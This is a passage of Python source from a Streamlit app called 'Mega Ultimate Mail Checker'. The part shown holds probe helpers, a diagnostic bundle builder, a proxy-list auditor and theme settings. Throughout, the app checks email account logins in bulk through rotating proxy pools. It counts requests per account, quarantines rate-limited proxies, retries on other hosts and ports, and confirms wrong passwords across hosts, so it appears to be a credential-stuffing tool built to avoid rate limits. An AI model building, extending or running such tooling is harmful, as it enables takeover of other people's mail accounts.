        c = getattr(_CFG_TLS, "cfg", None)
        if c:
            return c
    except Exception:
        pass
    c = STATE.get("cfg")
    if c:
        return c
    return globals().get("CFG") or {}


def probe_timeout() -> float:
    try:
        return float(live_cfg().get("PROBE_TIMEOUT", PROBE_TIMEOUT_DEFAULT))
    except Exception:
        return PROBE_TIMEOUT_DEFAULT


def active_protocols():
    """The selected protocols, always non-empty, IMAP-first."""
    try:
        picked = [p for p in (live_cfg().get("PROTOCOLS") or []) if p in PROTOCOL_OPTIONS]
    except Exception:
        picked = []
    if not picked:
        picked = list(PROTOCOL_SELECTION_DEFAULT)
    return [p for p in PROTOCOL_OPTIONS if p in picked]


def protocol_flags():
    picked = set(active_protocols())
    return {
        "imap": PROTOCOL_IMAP in picked,
        "pop": PROTOCOL_POP in picked,
        "smtp": PROTOCOL_SMTP in picked,
        "sieve": PROTOCOL_SIEVE in picked,
    }


# v13.64: THE PROBE TARGET WAS NEVER CHECKED FOR REACHABILITY.
# probe_targets() hands back the per-user override unconditionally, and the
# override is the queue-derived MAIL host restored after every fetch. When that
# host does not answer from the app host - excelsiorcarsandcourier.co.uk:993 did
# not, three full 8025 ms timeouts in the last bundle - every node is dialled at a
# destination with no listener and the whole pool reads `timeout`. _fetch_targets
# guards only the fetch itself; the ordinary probe, the Re-probe button and the
# first-load probe all walked straight into it.
#
# One direct TCP dial, cached for five minutes, is the whole guard. If the
# override does not answer, the 443 control is used instead - which is the clean
# baseline the probe is designed around - and the log says so once per TTL.
_TARGET_REACH = STATE.setdefault("probe_target_reach", {})
_TARGET_REACH_TTL = 300.0


def _target_answers(pairs):
    """True when at least one of `pairs` answers a direct TCP dial from this host."""
    now = time.time()
    for host, port, _label in (pairs or []):
        if not host:
            continue
        key = "%s:%s" % (host, port)
        hit = _TARGET_REACH.get(key)
        if hit and (now - hit[0]) < _TARGET_REACH_TTL:
            if hit[1]:
                return True
            continue
        ok = False
        try:
            _s = socket.create_connection((host, int(port)), timeout=3.0)
            _s.close()
            ok = True
        except Exception:
            ok = False
        _TARGET_REACH[key] = (now, ok)
        if ok:
            return True
        log_probe_event("probe target %s does not answer from this host - using the "
                        "443 control instead" % key)
    return False


def probe_targets():
    """Targets for the tunnel probe. THIS session's override only.

    FIX PERF-4: the override is consulted FIRST and unconditionally. It used to be
    honoured only in AUTO mode, so a user on the default '443 (HTTPS)' could never
    be steered onto a mail endpoint - and ipify:443 is exactly the target that lets
    a pool pass validation and then 407 on every IMAP login. Start Live Checking
    overwrites the override with the real queue-derived target.

    FIX ISO-7 (v13.61): the override lives in STATE, which is PROCESS state, so
    one user's queue-derived mail target was used by every other user's probe and
    spot check. The owner's own copy wins.

    v13.70 ISO-10: AND THE STATE FALLBACK WAS STILL ANOTHER USER'S QUEUE. The
    per-user copy was read first and then fell back to STATE - which block 076
    writes unconditionally on every start - so a session that had never started a
    run probed against, and spot-checked, the LAST person's mail host. Usually
    harmless because the host answers, but it is somebody else's destination. The
    fallback is gone: no override means the configured probe target, which
    defaults to the 443 control.

    v13.64: and it must ANSWER. See _target_answers() above.
    """
    try:
        ov = _user_state().get("probe_targets_override") or []
    except Exception:
        ov = []
    if ov:
        _ov = [t for t in ov if t and t[0]]
        if _ov and _target_answers(_ov):
            return _ov
        if _ov:
            return list(PROBE_CONTROL_TARGETS)
    try:
        name = live_cfg().get("PROBE_TARGET", PROBE_TARGET_DEFAULT)
    except Exception:
        name = PROBE_TARGET_DEFAULT
    return PROBE_TARGET_PORTS.get(name) or PROBE_TARGET_PORTS[PROBE_TARGET_AUTO]


def _any_run_active() -> bool:
    """True while ANY session has a run in flight.

    FIX ISO-4 (v13.49): run_active used to be a single process bool that whichever
    run finished FIRST cleared, so one user's exit told every other user's prober
    that nothing was running. Two consequences: the prober dropped to idle cadence
    (PROBE_WORKERS_DEFAULT, and the 300s staleness skip started applying), and
    refresh_alive_pool's "keep the current pool" guard stopped firing - so the
    next probe cycle that returned 0 wiped the pool out from under a live run and
    every remaining account went DIRECT.

    The count is the truth; the bool is derived from it. A teardown never reaches
    block 106's finally, so block 007 leaves the debt on the session and block 039
    repays it.
    """
    try:
        return int(STATE.get("runs_active", 0)) > 0
    except Exception:
        return bool(STATE.get("run_active"))


def probe_workers(bulk: bool = False) -> int:
    try:
        if bulk:
            return max(1, int(PROBE_WORKERS_BULK))
        base = PROBE_WORKERS_BUSY if _any_run_active() else PROBE_WORKERS_DEFAULT
        return max(1, int(base))
    except Exception:
        return PROBE_WORKERS_DEFAULT


def _estimated_rung_count():
    """How many rungs a typical account will actually dial."""
    try:
        flags = protocol_flags()
        n = 0
        if flags.get("imap"):
            n += 2
        if flags.get("pop"):
            n += 2
        if flags.get("smtp"):
            n += len(SMTP_RUNG_PORTS)
        if flags.get("sieve"):
            n += 1
        return max(1, n)
    except Exception:
        return 8


def request_budget():
    """Rough proxy-request accounting under the CURRENT settings."""
    try:
        nodes = len(all_proxies)
    except Exception:
        nodes = 0
    _c = live_cfg()
    per_node = 1 + (1 if _c.get("PROBE_SECOND_SCHEME",
                                PROBE_SECOND_SCHEME_DEFAULT) else 0)
    per_node *= max(1, int(_c.get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT)))
    try:
        sample = max(0, int(_c.get("PROBE_SAMPLE_MAX", 0)))
    except Exception:
        sample = 0
    probed = min(nodes, sample) if sample else nodes
    cycle = probed * per_node
    if _c.get("MAIL_SPOT_CHECK", MAIL_SPOT_CHECK_DEFAULT):
        cycle += min(MAIL_SPOT_NODES, probed)
    if _c.get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT):
        idle_per_min = cycle / max(1.0, PROBER_IDLE_SLEEP) * 60.0
    else:
        idle_per_min = 0.0
    rungs = _estimated_rung_count()
    rot = max(1, int(_c.get("MAX_ROTATIONS", MAX_ROTATIONS_DEFAULT)) + 1)
    passes = 2 if _c.get("CHECK_PASS2", CHECK_PASS2_DEFAULT) else 1
    return {"cycle": cycle, "idle_per_min": idle_per_min,
            "per_account": rungs * passes * rot * per_node}
# @@END 026 RUNTIME_HELPERS

# @@BLOCK 027 DIAG_ENV deps=-
def _env_info():
    info = {}
    info["python"] = sys.version.replace("\n", " ").strip()
    info["platform"] = platform.platform()
    info["machine"] = platform.machine()
    info["cwd"] = os.getcwd()
    try:
        info["streamlit"] = getattr(str_lit, "__version__", "unknown")
    except Exception:
        info["streamlit"] = "unknown"
    try:
        info["pandas"] = pd.__version__
    except Exception:
        info["pandas"] = "unknown"
    try:
        info["imaplib"] = getattr(imaplib, "__version__", "unknown")
    except Exception:
        info["imaplib"] = "unknown"
    try:
        import socks as _s
        info["pysocks"] = getattr(_s, "__version__", "present(no __version__)")
    except Exception:
        info["pysocks"] = "MISSING"
    try:
        import requests as _r
        info["requests"] = getattr(_r, "__version__", "present")
    except Exception:
        info["requests"] = "MISSING"
    try:
        import dns as _d
        info["dnspython"] = getattr(_d, "version", None) and str(_d.version.version) or "present"
    except Exception:
        info["dnspython"] = "MISSING"
    info["socks_ok_flag"] = SOCKS_OK
    info["hosts_ok"] = HOSTS_OK
    info["hosts_merge"] = _HAVE_HOSTS_MERGE
    info["status_ok"] = STATUS_OK
    info["ms_oauth_ok"] = MS_OAUTH_OK
    info["cfg_version"] = CFG_VERSION
    # FIX ISO-7 (v13.61): these five were named BARE, but v13.59 made four of them
    # per-user files, so this section reported ABSENT for files that existed - on
    # every deployment, for everybody. The live path is read from CFG; the label
    # keeps the old short name so the bundle still reads the same.
    _path_labels = (("proxies.txt", "PROXY_FILE"),
                    ("proxies_all.txt", "PROXY_ALL_FILE"),
                    ("proxy_meta.json", "PROXY_META_FILE"),
                    ("domain_cache.json", "CACHE_FILE"))
    for _label, _cfg_key in _path_labels:
        try:
            _f = live_cfg().get(_cfg_key) or _label
            if os.path.exists(_f):
                _stt = os.stat(_f)
                info[_label] = (f"{_stt.st_size} bytes, mtime "
                                f"{datetime.fromtimestamp(_stt.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
            else:
                info[_label] = "ABSENT"
        except Exception as e:
            info[_label] = f"stat error: {e}"
    try:
        if os.path.exists(THEME_FILE):
            _tstt = os.stat(THEME_FILE)
            info["theme.json"] = (f"{_tstt.st_size} bytes, mtime "
                                  f"{datetime.fromtimestamp(_tstt.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
        else:
            info["theme.json"] = "ABSENT"
    except Exception as e:
        info["theme.json"] = f"stat error: {e}"
    return info


def _e_for(fn):
    try:
        fn()
        return Exception("no error")
    except Exception as e:
        return e


def _imap_caps_selftest():
    """The exact v13.31 crash, replayed on a fake connection."""
    class _Fake:
        def __init__(self, caps):
            self.capabilities = caps

        def capability(self):
            return "OK", [b"IMAP4REV1 AUTH=PLAIN LOGINDISABLED"]

    lines = []
    cases = {
        "str tuple (what CPython 3.x really gives)": ("IMAP4REV1", "AUTH=PLAIN", "LOGINDISABLED"),
        "bytes tuple (what v13.31 assumed)": (b"IMAP4REV1", b"AUTH=PLAIN", b"LOGINDISABLED"),
        "empty tuple (forces the capability() call)": (),
        "None": None,
        "single str (not a tuple)": "IMAP4REV1 AUTH=PLAIN",
    }
    for label, caps in cases.items():
        try:
            m = _Fake(caps)
            got = sorted(_imap_caps(m))
            wants = "LOGINDISABLED" in got
            verdict = "wants AUTHENTICATE PLAIN" if wants else "will use LOGIN"
            lines.append(f"  OK   {label:46} -> caps={len(got):2} {verdict}")
        except Exception as e:
            lines.append(f"  FAIL {label:46} -> {type(e).__name__}: {e}")
    try:
        lines.append("  repro: b' '.join(str tuple) raises "
                     f"{type(_e_for(lambda: b' '.join(('IMAP4REV1',)))).__name__}")
    except Exception:
        pass
    return lines


def _probe_target_reachability(force=False):
    now = time.time()
    with STATE["target_reach_lock"]:
        cached = STATE.get("target_reach") or {}
        if not force and cached.get("rows") and (now - cached.get("ts", 0)) < 300:
            return cached["rows"]
    rows = []
    for host, port, label in PROBE_TARGET_PORTS["both (either)"]:
        row = {"target": f"{host}:{port}", "label": label}
        t0 = time.time()
        try:
            s = socket.create_connection((host, int(port)), timeout=3.0)
            s.close()
            row["ok"] = True
            row["ms"] = int((time.time() - t0) * 1000)
            row["err"] = ""
        except Exception as e:
            row["ok"] = False
            row["ms"] = int((time.time() - t0) * 1000)
            row["err"] = f"{type(e).__name__}: {str(e)[:120]}"
        try:
            row["resolved"] = socket.gethostbyname(host)
        except Exception as e:
            row["resolved"] = f"DNS FAIL {type(e).__name__}"
        rows.append(row)
    with STATE["target_reach_lock"]:
        STATE["target_reach"] = {"ts": now, "rows": rows}
    return rows
# @@END 027 DIAG_ENV

# @@BLOCK 028 DIAG_PROXY_AUDIT deps=-
def _detect_line_format(line):
    p = (line or "").strip()
    if not p:
        return "empty"
    if "://" in p:
        return "scheme:// (url form)"
    if "@" in p:
        return "user:pass@host:port"
    parts = p.split(":")
    if len(parts) == 4:
        return "host:port:user:pass"
    if len(parts) == 2:
        return "host:port (NO CREDS)"
    return f"UNRECOGNISED ({len(parts)} colon-parts)"


def _analyze_proxy_file():
    out = {"exists": False, "path": "", "total": 0, "unique": 0, "with_creds": 0,
           "unparsable": 0, "formats": {}, "dupe_map": {}, "sample": [],
           "distinct_ips": 0, "distinct_users": 0}
    try:
        path = live_cfg().get("PROXY_FILE", "proxies.txt")
    except Exception:
        path = "proxies.txt"
    out["path"] = path
    try:
        if not os.path.exists(path):
            return out
        out["exists"] = True
        with open(path, encoding="utf-8", errors="ignore") as f:
            raw = [l.rstrip("\n") for l in f]
        lines = [l.strip() for l in raw if l.strip() and not l.startswith("#")]
        out["total"] = len(lines)
        out["unique"] = len(list(dict.fromkeys(lines)))
        out["sample"] = lines[:10]
        ips, users = set(), set()
        for l in lines:
            fmt = _detect_line_format(l)
            out["formats"][fmt] = out["formats"].get(fmt, 0) + 1
            if "@" in l:
                out["with_creds"] += 1
            info = parse_proxy(l)
            if not info:
                out["unparsable"] += 1
                continue
            ips.add(info["host"])
            if info.get("user"):
                users.add(info["user"])
            hp = f"{info['host']}:{info['port']}"
            out["dupe_map"][hp] = out["dupe_map"].get(hp, 0) + 1
        out["distinct_ips"] = len(ips)
        out["distinct_users"] = len(users)
    except Exception as e:
        out["error"] = str(e)
    return out
# @@END 028 DIAG_PROXY_AUDIT

# @@BLOCK 029 DIAG_THREADS deps=-
def _thread_report():
    return [f"{t.name} | daemon={t.daemon} | alive={t.is_alive()}"
            for t in threading.enumerate()]


def _thread_stats():
    names = [t.name for t in threading.enumerate()]
    return {
        "total": len(names),
        "executor": sum(1 for n in names if n.startswith("ThreadPoolExecutor")),
        "scriptrunner": sum(1 for n in names if "ScriptRunner" in n),
        "alivepool": sum(1 for n in names if n == "alive-pool"),
        "firstprobe": sum(1 for n in names if n == "first-probe"),
        "startrefresh": sum(1 for n in names if n == "start-refresh"),
    }
# @@END 029 DIAG_THREADS

# @@BLOCK 030 DIAG_BUNDLE deps=025,027,028,029
def build_diagnostics_text():
    L = []

    def A(s=""):
        L.append(str(s))

    A("=" * 78)
    A(f"MEGA ULTIMATE MAIL CHECKER - {BUILD_TAG} DIAGNOSTIC BUNDLE")
    A(f"generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    A("=" * 78)

    A("")
    A("--- 0. IF YOU SEE 'TypeError: Importing a module script failed.' ---")
    A("  That string is SAFARI / iOS WebView's message for a DYNAMIC JAVASCRIPT")
    A("  CHUNK that failed to load.  Streamlit lazy-loads chunks with a content")
    A("  hash in the filename, so a redeploy changes every hash and an already-open")
    A("  tab keeps requesting the OLD names -> 404 -> one red box per failed chunk.")
    A("  NOT a Python error, NOT app.py.  FIX: hard-refresh (Ctrl/Cmd+Shift+R).")

    A("")
    A("--- 1. ENVIRONMENT ---")
    for k, v in _env_info().items():
        A(f"  {k:16}: {v}")
    A("  imaplib caps   : _get_capabilities() decodes with str(dat[-1], enc) "
      "=> mail.capabilities is a tuple of STR on CPython 3.x")

    A("")
    A("--- 1b. _imap_caps() REGRESSION SELF-TEST ---")
    for line in _imap_caps_selftest():
        A(line)

    A("")
    A("--- 1c. * BYE CLASSIFIER SELF-TEST ---")
    for _raw, _want in (
        ("command: LOGIN => IMAP server terminating connection", LOGIN_DROPPED),
        ("* BYE Connection is closed", LOGIN_DROPPED),
        ("* BYE Auth process broken", LOGIN_DROPPED),
        ("* BYE Too many simultaneous connections", RETRY_LATER),
        ("* BYE Too many invalid IMAP commands", RETRY_LATER),
        ("socket error: timed out", CONNECTION_FAILED),
        ("connection reset by peer", CONNECTION_FAILED),
        ("NO [AUTHENTICATIONFAILED] Invalid credentials", WRONG_PASSWORD),
        ("Socket error: 407: Proxy Authentication Required", CONNECTION_FAILED),
    ):
        try:
            _got = st_classify(_raw)
        except Exception as _ce:
            _got = f"<{_ce}>"
        A(f"  {'OK  ' if _got == _want else 'FAIL'} {_raw[:52]:54} -> {_got}"
          f"{'' if _got == _want else f'  (wanted {_want})'}")

    A("")
    A("--- 2. ACTIVE CONFIG (CFG) ---")
    try:
        for k in sorted(CFG.keys()):
            A(f"  {k:28}: {CFG.get(k)}")
    except Exception as e:
        A(f"  CFG unavailable: {e}")

    A("")
    A("--- 3. PROXY FILE AUDIT (proxies.txt) ---")
    fa = _analyze_proxy_file()
    A(f"  exists            : {fa.get('exists')}")
    A(f"  total lines       : {fa.get('total')}")
    A(f"  unique lines      : {fa.get('unique')}")
    A(f"  DISTINCT IPs      : {fa.get('distinct_ips')}   <-- the number that matters")
    A(f"  DISTINCT users    : {fa.get('distinct_users')}   <-- the 407 limit is per USER")
    A(f"  lines with '@'    : {fa.get('with_creds')}")
    A(f"  unparsable lines  : {fa.get('unparsable')}")
    A(f"  detected formats  : {fa.get('formats')}")
    A(f"  error             : {fa.get('error', '-')}")
    A("  -- first 10 lines VERBATIM --")
    for i, l in enumerate(fa.get("sample") or []):
        A(f"    [{i}] {l}")
    A("  -- host:port -> how many lines reference it (top 20) --")
    dm = sorted((fa.get("dupe_map") or {}).items(), key=lambda kv: -kv[1])[:20]
    if dm:
        for hp, n in dm:
            A(f"    {hp:28} x{n}")
    else:
        A("    (none parsed)")
    try:
        _pa_path = live_cfg().get("PROXY_ALL_FILE") or "proxies_all.txt"
        if os.path.exists(_pa_path):
            with open(_pa_path, encoding="utf-8", errors="ignore") as _pa:
                A(f"  proxies_all.txt   : {sum(1 for l in _pa if l.strip())} raw line(s) backed up")
        else:
            A("  proxies_all.txt   : ABSENT (written by the next Fetch & Test)")
    except Exception as _pae:
        A(f"  proxies_all.txt   : stat error {_pae}")

    A("")
    A("--- 4. PROBE-TARGET REACHABILITY FROM THIS APP HOST (direct, no proxy) ---")
    for r in _probe_target_reachability():
        A(f"  {r['target']:24} resolved={r.get('resolved', '?'):18} "
          f"tcp={'OK' if r['ok'] else 'FAIL'} {r['ms']}ms {r['err']}")

    A("")
    A("--- 5. EGRESS IDENTITY (this app host) ---")
    try:
        g = direct_geo()
        A(f"  ip={g.get('ip')} country={g.get('country')} "
          f"region={g.get('region')} vpn={g.get('vpn')}")
        A(f"  isp={direct_isp()[:120]}")
    except Exception as e:
        A(f"  geo error: {e}")

    A("")
    A("--- 6. POOL STATE ---")
    A(f"  selected protocols  : {active_protocols()}")
    A(f"  loaded proxies      : {len(all_proxies)}")
    A(f"  filtered pool       : {len(filtered_pool)}")
    A(f"  alive pool          : {len(alive_pool)}")
    A(f"  quarantined (407)   : {quarantine_size()}")
    # FIX ISO-7 (v13.61): probe_in_flight / first_probe_kicked / probe_runs moved
    # into _user_state() at v13.59 and were still read off STATE here, so all
    # three reported None in every bundle ever produced.
    A(f"  probe_in_flight     : {_US.get('probe_in_flight')}")
    A(f"  probe lock held     : {_PROBE_OWNER_LOCK.locked()}")
    A(f"  first_probe_kicked  : {_US.get('first_probe_kicked')}")
    A(f"  run_active          : {STATE.get('run_active')}")
    A(f"  probe_runs          : {_US.get('probe_runs')}")
    A(f"  CONFIRM_WRONG_ACROSS_HOSTS: {CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')}")
    A(f"  ALLOW_SELF_SIGNED / TLS_STRICT: "
      f"{CFG.get('ALLOW_SELF_SIGNED')} / {CFG.get('TLS_STRICT')}")
    _lp = _US.get("last_probe_ts", 0.0)
    A(f"  last_probe         : {int(time.time() - _lp)}s ago" if _lp else "  last_probe         : never")
    A(f"  process uptime     : {int(time.time() - STATE.get('process_start', time.time()))}s")
    A(f"  probe target/budget: {CFG.get('PROBE_TARGET')} / {probe_timeout():.0f}s "
      f"/ strict={CFG.get('PROBE_STRICT')}")
    A(f"  probe targets(live): {[t[0] + ':' + str(t[1]) for t in probe_targets()]}")
    A(f"  probe workers      : {probe_workers()} idle/run, {probe_workers(bulk=True)} bulk "
      f"(batch budget {PROBE_BATCH_BUDGET:.0f}s)")
    _ms = STATE.get("mail_spot") or {}
    if _ms.get("user") and _ms.get("user") != _gate_scope():
        _ms = {}
    if _ms.get("n"):
        A(f"  MAIL-DEST SPOT      : {_ms['host']}:{_ms['port']} -> pass={_ms['ok']} "
          f"407={_ms['auth']} other={_ms['other']} of {_ms['n']} node(s), "
          f"{int(time.time() - _ms.get('ts', 0))}s ago")
        if _ms.get("auth") and not _ms.get("ok"):
            A("  *** pool passes the WEB probe but the provider 407s MAIL destinations ***")
        if _ms.get("error"):
            A(f"  spot error          : {_ms['error'][:200]}")
    else:
        A("  MAIL-DEST SPOT      : not run yet")
    A(f"  HOST_CONCURRENCY    : {CFG.get('HOST_CONCURRENCY')}")
    A(f"  PROXY_CONCURRENCY   : {CFG.get('PROXY_CONCURRENCY')}")
    A(f"  PROXY_IP_CONCURRENCY: {CFG.get('PROXY_IP_CONCURRENCY')}")
    A(f"  PROXY_SUBUSER_CONC  : {CFG.get('PROXY_SUBUSER_CONCURRENCY')}   <-- 407 control")
    _rb = request_budget()
    A(f"  REQUEST BUDGET      : ~{_rb['per_account']} proxy req/account - "
      f"{_rb['idle_per_min']:.0f}/min idle probing - {_rb['cycle']} per pool cycle")
    A(f"  PROBE_MAX_TARGETS   : {CFG.get('PROBE_MAX_TARGETS')}")
    A(f"  PROBE_SECOND_SCHEME : {CFG.get('PROBE_SECOND_SCHEME')}")
    A(f"  PROBER_IDLE_ENABLED : {CFG.get('PROBER_IDLE_ENABLED')}")
    A(f"  PROBE_SAMPLE_MAX    : {CFG.get('PROBE_SAMPLE_MAX')}")
    A(f"  MAIL_SPOT_CHECK     : {CFG.get('MAIL_SPOT_CHECK')}")
    A(f"  MAX_ROTATIONS       : {CFG.get('MAX_ROTATIONS')}")
    A(f"  CHECK_PASS2         : {CFG.get('CHECK_PASS2')}")
    A(f"  DIRECT_FIRST        : {CFG.get('DIRECT_FIRST')}")
    A(f"  RANDOM_ROTATION     : {CFG.get('RANDOM_ROTATION')}")
    A(f"  CONNECT_FLOOR/READ  : {CONNECT_FLOOR_DEFAULT} / {READ_FLOOR_DEFAULT}")
    A(f"  LEGACY RUNG LEASH   : {LEGACY_RUNG_TIMEOUT}s on ports {LEGACY_PORTS}")
    A(f"  407 CONTRACT        : quarantine={PROXY_407_QUARANTINE} "
      f"force_direct={PROXY_407_FORCE_DIRECT} cooldown={PROXY_407_COOLDOWN:.0f}s "
      f"same_host_retries={CFG.get('SAME_HOST_RETRIES')}")
    A(f"  HELO name           : {smtp_helo_name()}")

    A("")
    A("--- 7. PROBE REASON HISTOGRAM (most recent probe per node) ---")
    for r, n in probe_reason_histogram().items():
        A(f"  {_PROBE_REASON_LABEL.get(r, r):16}: {n}")

    A("")
    A("--- 8. PER-NODE TABLE ---")
    A("  key | host:port | user | reason | lat_ms | attempts | country | last_error")
    with probe_stats_lock:
        psnap = dict(probe_stats)
    with proxy_lock:
        msnap = dict(proxy_meta)
    for k in sorted(set(list(psnap.keys()) + list(msnap.keys()))):
        ps = psnap.get(k) or {}
        m = msnap.get(k) or {}
        info = parse_proxy(k)
        hp = f"{info['host']}:{info['port']}" if info else "UNPARSABLE"
        user = (info.get("user") if info else "") or "-"
        A(f"  {k} | {hp} | {user} | {ps.get('reason', '-')} | "
          f"{ps.get('latency_ms', 0)} | {ps.get('attempts', 0)} | "
          f"{m.get('country', '?')} | {ps.get('error', '')}")

    A("")
    A("--- 9. QUARANTINE / CIRCUIT BREAKERS ---")
    with proxy_quarantine_lock:
        A(f"  quarantined: {sorted(proxy_quarantine)}")
    A(f"  407 strikes: {dict(_proxy_407)}")
    now = time.time()
    A("  circuit-broken (30s): "
      f"{ {k: f'{v - now:.0f}s left' for k, v in circuit_breaker_until.items() if v > now} }")
    with _proxy_scheme_lock:
        A(f"  scheme memory: {dict(_proxy_scheme)}")
    A(f"  407 cooldown map entries: {len(proxy_407_until or {})}")

    A("")
    A("--- 10. CACHES & THREADS ---")
    with probe_stats_lock:
        A(f"  probe_stats entries : {len(probe_stats)}")
    A(f"  proxy_meta entries  : {len(proxy_meta)}")
    A(f"  geo cache entries   : {len(_GEO_CACHE)} (negative cache: {len(_GEO_FAIL)})")
    A(f"  dns cache entries   : {len(_DNS_CACHE)} (shared, TTL {_DNS_TTL:.0f}s)")
    A(f"  startup dedupe set  : {len(_STARTUP_SEEN)}")
    with _SMTP_LOCK:
        A(f"  smtp cache entries  : {len(_SMTP_DOMAIN_CACHE)}")
    _ts = _thread_stats()
    A(f"  live threads        : {_ts['total']} (ThreadPoolExecutor={_ts['executor']}, "
      f"ScriptRunner={_ts['scriptrunner']}, alive-pool={_ts['alivepool']}, "
      f"first-probe={_ts['firstprobe']}, start-refresh={_ts['startrefresh']})")
    A("  threads:")
    for t in _thread_report():
        A(f"    {t}")

    A("")
    A("--- 11. RECENT PROBE EVENTS (last 60) ---")
    with probe_log_lock:
        tail = list(probe_log)[-60:]
    for e in tail:
        A(f"  {e}")
    if not tail:
        A("  (none)")

    A("")
    A("--- 12. STARTUP LOG TAIL (last 60) ---")
    for e in startup_panel_lines()[-60:]:
        A(f"  {e}")

    A("")
    A("=" * 78)
    A("END OF DIAGNOSTIC BUNDLE")
    A("=" * 78)
    return "\n".join(L)
# @@END 030 DIAG_BUNDLE

# @@BLOCK 031 THEME_DATA deps=-
# FIX ISO-7 (v13.61): THE THEME WAS SHARED. theme.json lived in the working
# directory, so two people on one deployment overwrote each other's colours,
# radius and hero text - the one preference a user actually notices. It is a
# per-user file now, named by the unlocked prefix. This block runs AFTER
# auth.require() in block 007, so the hash already exists here.
THEME_FILE = user_file("theme.json")

THEME_PRESETS = {
    "Aurora":    {"g1": "#667eea", "g2": "#764ba2", "accent": "#8b5cf6", "accent2": "#22d3ee", "bg": "#0b1020", "panel": "#141b30", "text": "#e6ebff"},
    "Neon":      {"g1": "#f72585", "g2": "#7209b7", "accent": "#f72585", "accent2": "#4cc9f0", "bg": "#0a0118", "panel": "#180a2c", "text": "#f5e9ff"},
    "Ocean":     {"g1": "#2193b0", "g2": "#6dd5ed", "accent": "#38bdf8", "accent2": "#22d3ee", "bg": "#04141c", "panel": "#0a2432", "text": "#e0f7ff"},
    "Emerald":   {"g1": "#11998e", "g2": "#38ef7d", "accent": "#34d399", "accent2": "#a3e635", "bg": "#06140f", "panel": "#0e2519", "text": "#e3ffee"},
    "Sunset":    {"g1": "#ff6b6b", "g2": "#f9a826", "accent": "#fb923c", "accent2": "#ffd166", "bg": "#1a0f0a", "panel": "#2b1a11", "text": "#fff3e6"},
    "Crimson":   {"g1": "#eb3349", "g2": "#f45c43", "accent": "#f43f5e", "accent2": "#fb923c", "bg": "#160609", "panel": "#270c13", "text": "#ffe8ec"},
    "Royal":     {"g1": "#243b55", "g2": "#4b6cb7", "accent": "#60a5fa", "accent2": "#c084fc", "bg": "#070b12", "panel": "#111a28", "text": "#e2e8f5"},
    "Gold":      {"g1": "#b8860b", "g2": "#ffd700", "accent": "#fbbf24", "accent2": "#f59e0b", "bg": "#141005", "panel": "#251d0a", "text": "#fff8dc"},
    "Candy":     {"g1": "#ff9a9e", "g2": "#fecfef", "accent": "#fb7185", "accent2": "#f9a8d4", "bg": "#1a1016", "panel": "#2b1a24", "text": "#fff0f6"},
    "Cyber":     {"g1": "#00f5d4", "g2": "#0077b6", "accent": "#00f5d4", "accent2": "#90e0ef", "bg": "#03060d", "panel": "#0a1220", "text": "#dffffb"},
    "Grape":     {"g1": "#8e2de2", "g2": "#4a00e0", "accent": "#a78bfa", "accent2": "#f472b6", "bg": "#0b0418", "panel": "#180a2b", "text": "#f1e8ff"},
    "Daylight":  {"g1": "#6366f1", "g2": "#06b6d4", "accent": "#4f46e5", "accent2": "#0891b2", "bg": "#f1f5f9", "panel": "#ffffff", "text": "#0f172a"},
    "Mono":      {"g1": "#3f3f46", "g2": "#71717a", "accent": "#a1a1aa", "accent2": "#d4d4d8", "bg": "#0a0a0b", "panel": "#19191c", "text": "#f4f4f5"},
}


def _lum(hex_color: str) -> float:
    try:
        h = str(hex_color).lstrip("#")
        r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
        return (0.299 * r + 0.587 * g + 0.114 * b) / 255.0
    except Exception:
        return 0.0


def _readable_text(th: dict) -> str:
    """`text`, or white/black when `text` and `bg` are too close to read.

    is_light() only looked at bg, so a dark bg with a dark text colour rendered
    every character in near-black on black. Emoji survived (colour glyphs) and
    the words vanished, which reads as "the page hangs / only dark".
    """
    t, b = _lum(th.get("text", "#ffffff")), _lum(th.get("bg", "#000000"))
    if abs(t - b) >= 0.35:
        return th.get("text", "#ffffff")
    return "#0f172a" if b > 0.6 else "#f4f6fb"


def default_theme() -> dict:
    p = THEME_PRESETS["Aurora"]
    return {
        "preset": "Aurora",
        "g1": p["g1"], "g2": p["g2"], "accent": p["accent"], "accent2": p["accent2"],
        "bg": p["bg"], "panel": p["panel"], "text": p["text"],
        "radius": 14, "glow": True, "animate": True, "glass": True,
        "colorize_logs": True,
        "hero_title": f"⚡ Mega Ultimate Mail Checker {BUILD_TAG}",
        "hero_sub": "Plug-and-play edition - click 📥 Fetch & Test All Proxies, then press "
                    "Start. A single AUTHENTICATIONFAILED is PROVISIONAL: the ladder keeps "
                    "going (POP3, sibling hosts, 143/110, then DIRECT) until a SECOND host "
                    "agrees or nothing is left to try. Allow Self-Signed is a real switch, "
                    "the phone layout is fixed, and the Fast-Mode cooldown arms on "
                    "inconclusive results only.",
    }


def load_theme() -> dict:
    base = default_theme()
    if os.path.exists(THEME_FILE):
        try:
            with open(THEME_FILE, encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                base.update({k: v for k, v in data.items() if k in base})
        except Exception:
            pass
    # The hero text is a BUILD STRING and base.update() lets the file win over
    # default_theme() - so a theme.json written by an older build made the app
    # advertise that old version for ever.
    if BUILD_TAG not in str(base.get("hero_title", "")):
        _d = default_theme()
        base["hero_title"] = _d["hero_title"]
        base["hero_sub"] = _d["hero_sub"]
        try:
            save_theme(base)
        except Exception:
            pass
    return base


def save_theme(th: dict):
    try:
        with open(THEME_FILE, "w", encoding="utf-8") as f:
            json.dump(th, f, indent=2)
    except Exception:
        pass


def is_light(th: dict) -> bool:
    return _lum(th.get("bg", "#000000")) > 0.6


# FIX ISO-7: a Forget + second unlock in the SAME tab leaves session_state holding
# the previous user's theme and its th_* widget keys, so the new user inherited the
# old user's colours and then saved them as their own. On an owner change the theme
# and every th_* key are dropped, and load_theme() reads the new owner's own file.
if str_lit.session_state.get("_theme_owner") != os.path.basename(user_file("")):
    str_lit.session_state.pop("theme", None)
    for _tk in ("th_preset", "th_g1", "th_g2", "th_accent", "th_accent2", "th_bg",
                "th_panel", "th_text", "th_radius", "th_glow", "th_glass",
                "th_animate", "th_hero_title", "th_hero_sub", "colorize_logs"):
        str_lit.session_state.pop(_tk, None)
    str_lit.session_state["_theme_owner"] = os.path.basename(user_file(""))

if "theme" not in str_lit.session_state:
